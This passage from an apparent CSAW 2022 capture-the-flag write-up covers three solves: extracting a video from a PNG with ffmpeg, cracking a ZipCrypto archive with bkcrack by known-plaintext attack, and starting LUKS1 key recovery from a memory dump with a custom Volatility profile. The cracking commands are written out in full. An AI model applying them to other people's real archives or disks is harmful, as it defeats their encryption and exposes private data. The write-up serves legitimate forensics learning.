clever!</p>\n<p>Webm is actually the only extension we’ve found thats a Joker, can be an image/audio/video. Which makes it special. That’s it, by luck, we got it, WEBM.</p>\n<p>However we tried a lot of extenison, it was a game of trial and error, for instance we checked mp4, wmv, avi, mkv, flv, mov, you name it…</p>\n<p>FFmpeg needs a pixel format, well, there is a hude table of these formats…</p>\n<figure class=\"highlight bash\"><figcaption><span>pixels format</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=     yuv420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuyv422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     yuv410p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv411p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      rgb565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      rgb555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        gray, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       monow, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=       monob, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=        pal8, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    yuvj420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      xvmcmc, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=    xvmcidct, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=     uyvy422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=   uyyvyy411, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=      bgr565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      bgr555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        bgr8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        bgr4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   bgr4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   rgb4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     rgb32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     bgr32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    gray16be, nb_channels=   1, depth=  16, is_alpha=n</span><br><span class=\"line\">name=    gray16le, nb_channels=   1, depth=  16, is_alpha=n</span><br></pre></td></tr></table></figure>\n<p>Well, we didn’t guess, we, at this stage, after looking deeply into the image, and as said before, the RGB channels are carrying noise that surely represent the video, however the alpha channel is the one that shape the picture as we see it in the previews. So the pixel format we choose is rgb24 excluding the alpha channel.</p>\n<p>The final command is:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i noir.png -pix_fmt rgb24  -f rawvideo - &gt; vid.webm</span><br></pre></td></tr></table></figure>\n<p>Coool, after all the hustle we’ve got a video, a subway with blinking lights, or should I say, Morse Code!<br>\nThe clock was ticking, we’re at the final hours of the CTF, and the video is 2 mins long.<br>\nCould there be any OpenCV tool for this! Of course, here is a link you might need it as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhemVyMjAxNS9Nb3JzZURlY29kZXI=\">MorseDecoder</span></p>\n<p>Here is a link for the video as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOU5TOTJXblZZMUlNbEc0aHlFWVh2c0U3MWpfbTFDcG8vdmlldz91c3A9c2hhcmluZw==\">video.webm</span></p>\n<p>Using the tool, I let it record my screen and positioned the cross selection on the train lights. Within a minute we’ve got the flag!</p>\n<p><img data-src=\"https://i.imgur.com/wh0uUv2.png\" alt=\"\"></p>\n<p>Finally, it was a creative challenge we must say!</p>\n<p>The flag is  <code>(flag)sil3nt_refl3ct1on</code></p>\n<h1 id=\"not-too-taxing-digital-forensics-cryptography\"><a class=\"markdownIt-Anchor\" href=\"#not-too-taxing-digital-forensics-cryptography\">#</a> Not Too Taxing: Digital Forensics / Cryptography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>We intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can’t figure out the password to the file in order to extract the data. Attached are the two extracted files, Tax_Ret_Form_Blank.pdf and Tax_Ret_Form_Nov_2021.zip, and a transcript of the emails we found, SPBlock_Email.pdf.</p>\n<p>Can you figure out the password so we can get this guy’s info?</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Not Too Taxing</p>\n          </div></div></div>\n<p>In this challenge we were given, an encrypted zip archive containing a filled state tax form document for the month of Novemeber 2021, the emails transmitted between … and the client, as well as the template of the tax form blank.</p>\n<p>We’ve noticed the zip was using the ZipCrypto Store compression, which is breakable if you can find 12 bytes of the data inside the zip, 8 of which got to be contiguous.</p>\n<p>ZipCrypto is considered as the legacy encryption of archives, you must be aware that it is the default method used in most Linux distros: ZipCrypto Deflate. Thus you might want to manually change that method when compressing to AES for higher security.</p>\n<p>The ZipCrypto algorithm generates a pseudo-random stream of bytes/keystream, which is XORed to the entry’s content. to produce the encrypted data. The generator’s state made of three 32-bits integers (keys), is initialized using the password and then contiuously updating as encryption goes on.</p>\n<p>This encryption algorithm is vulnerable to known plaintext attacks to recover the content fully.</p>\n<p>We’re going to use  <code>bkcrack</code>  tool which can recover the content of the archive, change a zip archive’s password, and recover the original password. All by retrieving the zip archive three generated keys.</p>\n<p>The installation is pretty straight forward, just git clone the repo then,</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install</span><br><span class=\"line\">cmake --build build --config Release</span><br><span class=\"line\">cmake --build build --config Release --target install</span><br></pre></td></tr></table></figure>\n<p>Well, we must use the blank tax form as our plaintext attack, as it shares a lot of identical bytes with the filled form inside the zip.</p>\n<p>However you can’t just feed the pdf to bkcrack and hope for it to crack the zip. The tool requires a non encrypted zip with the similar bytes inside to attack the encrypted zip.</p>\n<p>So let’s get our blank form inside a zip and specify the method of encryption as ZipCrypto and the compression level as store. Now we guarantee there are plenty of similar bytes to execute the attack.</p>\n<p><img data-src=\"https://i.imgur.com/ouMza3O.png\" alt=\"\"></p>\n<p>First we retrieve the three keys from the zip archive using</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -c Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Blank.zip -p Tax_Ret_Form_Blank.pdf</span><br></pre></td></tr></table></figure>\n<p>-C: Specifies the encrypted zip archive<br>\n-c: Specifies the target file within the archive<br>\n-P: Specifies the plaintext zip archive<br>\n-p: specifies the plaintext file within the non encrypted archive.</p>\n<p>Now let it process for a while, it should not take long, as we provided more than enough data to bkcrack.</p>\n<p>Here are they keys I have got:</p>\n<figure class=\"highlight bash\"><figcaption><span>result</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b2c4a24e f036ff3a 998f6727</span><br></pre></td></tr></table></figure>\n<p>If the compression wasn’t Store, and instead it was Deflate, then the Github repo provides some python scripts to decompress those types, just first include  <code>-d deciphered</code>  at the end of the previous command.</p>\n<p>Then run:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 tools/inflate.py deciphered decompressed</span><br></pre></td></tr></table></figure>\n<p>In our case, it was just Store, so we move on to the next step, we’re going to recreate the very same archive with a password of our choise, this is the fastest way around Zip crypto archives, you can go ahead and retrieve the password, we will show that. However that process will take a bit longer.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -k b2c4a24e f036ff3a 998f6727 -U unlocked.zip 1234</span><br></pre></td></tr></table></figure>\n<p>And within a second, we got our new archive with the filled document restored successfully!</p>\n<p><img data-src=\"https://i.imgur.com/8x38gOi.png\" alt=\"\"></p>\n<p>And the flag was:  <code>flag&#123;1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u&#125;</code></p>\n<p>However if you want the hard way, you can retrieve the original password of the archive using the three keys, you might need to know the length though, or guess it. Tideous task…</p>\n<p>Anyways, here is the command you would use for that:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -k b2c4a24e f036ff3a 998f6727 -r 8..12 ?p</span><br></pre></td></tr></table></figure>\n<p>-r to specify the length, it can be a rough number or an interval.</p>\n<p>Sorry, I didnt bother to get the password 😃)</p>\n<p>It was a creative challenge. However I must say that we did not check the email content document at all lol!</p>\n<h1 id=\"encrypted-disk-digital-forensics\"><a class=\"markdownIt-Anchor\" href=\"#encrypted-disk-digital-forensics\">#</a> Encrypted Disk: Digital Forensics</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>th31nk encrypted his disk and forgot the password, can you help him? Flag is what you find, no need to wrap</p>\n<p>HINT: Custom Profile</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Encrytped Disk</p>\n          </div></div><div class=\"item\" title=\"Author - Crazyman\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\" data-background-image=\"https://pbs.twimg.com/profile_images/1427918895424282628/NR5jaECn_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\">Author - Crazyman</span>\n          <p class=\"desc\">Crazyman Twitter Profile</p>\n          </div></div></div>\n<p>In this challenge we got a disk image &amp; a memory dump. The Description tell us that the user encrypted his disk and forgot the password! So we can understand that the memory dump will help us to decrypt the disk to get the flag! right?? Let’s Check what we have !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ file *</span><br><span class=\"line\">forensic.img: LUKS encrypted file, ver 1 [aes, ecb, sha1] UUID: 61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\">memory.raw:   data</span><br></pre></td></tr></table></figure>\n<p>As you see we have LUKS encrypted file version1! I will say it again! it’s verion 1!!!<br>\nOh wait what is LUKS??!</p>\n<p>LUKS or the Linux Unified Key Setup is a disk encryption specification created by Clemens Fruhwirth in 2004 and was originally intended for Linux.<br>\nWhile most disk encryption softwares implement different, incompatible, and undocumented formats, LUKS implements a platform-independent on-disk format for use in various tools. This not only faciliates compatibility and interoperability among different programs, but also assures that they all implement password management in a secure and documented manner. Per Wikipedia.</p>\n<p>Unlike most blogs say, you should stick with LUKS2 if you are applying it to your disk, since it provides an extra layer of security by storing the master key in the kernel directly. However LUKS1 masterkey gets loaded in the RAM when you try to unlock it, and that what we are going to grab from the memory dump!</p>\n<p>The encrypted master key is stored as plaintext in the LUKS header. However once we mount it and get prompted to enter a passphrase, at least one of eight (LUKS support up to 8 passphrases), the decrypted master key (AES) is loaded into the memory.</p>\n<p><img data-src=\"https://i.imgur.com/GOTSIPB.png\" alt=\"\"><br>\n<em>Image courtesy: MDPI</em></p>\n<p>When we tried to use <span class=\"exturl\" data-url=\"aHR0cDovL1ZvbGF0aWxpdHkucHk=\">Volatility.py</span> against the memory dump we had some troubles finding the right profile.</p>\n<p>We are sure that this memory image is linux one, because we have LUKS. Let’s figure out what is the distrubition and the version to search or make our volatility profile to work with!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.ram | grep <span class=\"string\">&quot;Linux version&quot;</span></span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Oh it’s <span class=\"pinky\">Ubuntu 16.04.4</span> with low-latency kernel! oh wait what? what did you mean by low-latency kernel?<br>\nAs I know there is various type of linux kernel like Real-tim kernel, generic kernel, Low-latency kernel<br>\nThis types of kernel varies in the type of the scheduler and their algorithm, as well as the system interuption… etc! None is better than the other! Each one has its use case.</p>\n<p>For example the low-latency one can reduce audio latency and the context switches are more frequent. This type of kernel has a scheduler that is not suitable for a server environment! But it will be good for a professional audio or video editing!</p>\n<p>Ok now i guess you get it ! It’s time to make our profile! In this demo we will make a volatility profile with low-latency kernel using docker container. It’s better than downloading a whole VM! Don’t waste time in that!</p>\n<p>Let’s download volatiltiy man</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ git <span class=\"built_in\">clone</span> https://github.com/volatilityfoundation/volatility</span><br><span class=\"line\">Cloning into <span class=\"string\">&#x27;volatility&#x27;</span>...</span><br><span class=\"line\">remote: Enumerating objects: 27411, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Cceiving objects:   7% (1919/27411), 340.01 KiB | 652.00 KiB/s</span><br></pre></td></tr></table></figure>\n<p>In Volatility repository there is  <code>/tools/linux</code>  directory that contains tools that allow us to make a linux profile. In this directory there is a file called <span class=\"pinky\">Makefile</span> that contains important information ! Let’s check it!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ <span class=\"built_in\">cat</span> Makefile</span><br><span class=\"line\">obj-m += module.o</span><br><span class=\"line\">KDIR ?= /</span><br><span class=\"line\">KVER ?= $(shell <span class=\"built_in\">uname</span> -r)</span><br><span class=\"line\"></span><br><span class=\"line\">-include version.mk</span><br><span class=\"line\"></span><br><span class=\"line\">all: dwarf</span><br><span class=\"line\"></span><br><span class=\"line\">dwarf: module.c</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> modules</span><br><span class=\"line\">        dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\">        <span class=\"built_in\">rm</span> -f module.dwarf</span><br></pre></td></tr></table></figure>\n<p>Look at the  <code>KVER</code>  variable , it contains your current kernel version! it’s an automatic kernel detection! in our case we will change it with the version of kernel that we will use it! Check the Linux Version from the output of the last strings command that we runed on the memory dump.<br>\nchange  <code>$(shell uname -r)</code>  with  <code>4.4.0-72-lowlatency</code> . Do it manually or use the magic of  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>Sed Magic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ sed -i <span class=\"string\">&#x27;s/$(shell uname -r)/4.4.0-72-lowlatency/g&#x27;</span> Makefile</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to run a <span class=\"pinky\">Ubuntu 16.04.4</span> docker container and mount the current direcotry that contains the tools to build the profile. We can use the variable environment $PWD to indicate the current path easly. Don’t waste your time writing the whole path man !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --<span class=\"built_in\">rm</span> -v <span class=\"variable\">$PWD</span>:/volatility ubuntu:16.04 /bin/bash</span><br><span class=\"line\">Unable to find image <span class=\"string\">&#x27;ubuntu:16.04&#x27;</span> locally</span><br><span class=\"line\">16.04: Pulling from library/ubuntu</span><br><span class=\"line\">58690f9b18fc: Downloading [=========&gt;                                         ]  8.522MB/46.5MB</span><br><span class=\"line\">b51569e7c507: Download complete</span><br><span class=\"line\">da8ef40b9eca: Download complete</span><br></pre></td></tr></table></figure>\n<p>Just wait until the container is pulled &amp; get your bash !</p>\n<figure class=\"highlight bash\"><figcaption><span>The ubuntu container is ready</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Digest: sha256:91bd29a464fdabfcf44e29e1f2a5f213c6dfa750b6290e40dd6998ac79da3c41</span><br><span class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> ubuntu:16.04</span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>Since our ubuntu container is ready to use. Let’s install the low-latency kernel and the essentials packages for building the profile.</p>\n<figure class=\"highlight bash\"><figcaption><span>Install our packages</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># apt update &amp;&amp; apt install -y linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency build-essential dwarfdump make zip</span></span><br><span class=\"line\">Get:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [99.8 kB]</span><br><span class=\"line\">Get:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB]</span><br><span class=\"line\">Get:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [2051 kB]</span><br><span class=\"line\">Get:4 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [99.8 kB]</span><br><span class=\"line\">Get:5 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [97.4 kB]</span><br><span class=\"line\">Get:6 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB]</span><br><span class=\"line\">Get:7 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [15.9 kB]</span><br></pre></td></tr></table></figure>\n<p>Ah man you’ll wait again until the installation is done! After the installation is finished let’s check our volatility tools inside the container then make the profile !</p>\n<figure class=\"highlight bash\"><figcaption><span>Make The profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class=\"line\">boot  etc  initrd.img  lib64  mnt    proc  run   srv   tmp  var  volatility</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># cd volatility/</span></span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># ls</span></span><br><span class=\"line\">Makefile  Makefile.enterprise  kcore  module.c</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># make</span></span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;/volatility&quot;</span> modules</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CC [M]  /volatility/module.o</span><br><span class=\"line\">  Building modules, stage 2.</span><br><span class=\"line\">  MODPOST 1 modules</span><br><span class=\"line\">  CC      /volatility/module.mod.o</span><br><span class=\"line\">  LD [M]  /volatility/module.ko</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build M=<span class=\"string\">&quot;/volatility&quot;</span> clean</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CLEAN   /volatility/.tmp_versions</span><br><span class=\"line\">  CLEAN   /volatility/Module.symvers</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Now let’s zip the result of the make command (module.dwarf) and the system map file from the  <code>/boot</code>  :</p>\n<ul>\n<li>\n<p>The system map file contains the Symbols that will be used by volatility to run the plugin correctly. It list function entry points and addresses of kernel data structures of a particular build of a kernel!</p>\n</li>\n<li>\n<p>The  <code>module.dwarf</code>  contains the  <code>vtypes</code>  of this kernel module! To make we can call  <code>vtypes</code>  as the kernel’s data structures. To make it more easy  <code>vtypes</code>  is a small library to define  <code>Validating Types</code>  that will be used by the kernel !</p>\n</li>\n</ul>\n<p>Why we zip the  <code>module.dwarf</code>  and the  <code>System.map</code>  file? It’s simple man! These two files represent the whole profile that will be used by volatility! Volatility requires these 2 files to be in zip to deal with it as profile! Wow man, our profile is coming!</p>\n<p>zip Ubuntu1604.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</p>\n<figure class=\"highlight bash\"><figcaption><span>Zip the 2 files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># zip Ubuntu1604-low.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</span></span><br><span class=\"line\">  adding: module.dwarf (deflated 89%)</span><br><span class=\"line\">  adding: boot/System.map-4.4.0-72-lowlatency (deflated 79%)</span><br></pre></td></tr></table></figure>\n<p>Now just leave our ubuntu container. we finished the 1st step of the challenge and you learn how to make a cool &amp; custom linux profile! Now you can copy this zip file to  <code>/plugins/overlays/linux/</code>  directory in your volatility environment.</p>\n<p>Sanity Check please ! Let’s list all the ubuntu profiles available!</p>\n<figure class=\"highlight bash\"><figcaption><span>check the availability of the profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py --info | grep -i ubuntu </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">LinuxUbuntu1604-lowx64     - A Profile <span class=\"keyword\">for</span> Linux Ubuntu1604-low x64</span><br></pre></td></tr></table></figure>\n<p>Cool! we found our new profile recognized by volatility ! Now it’s time to try use it.</p>\n<figure class=\"highlight bash\"><figcaption><span>Test the new profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_banner   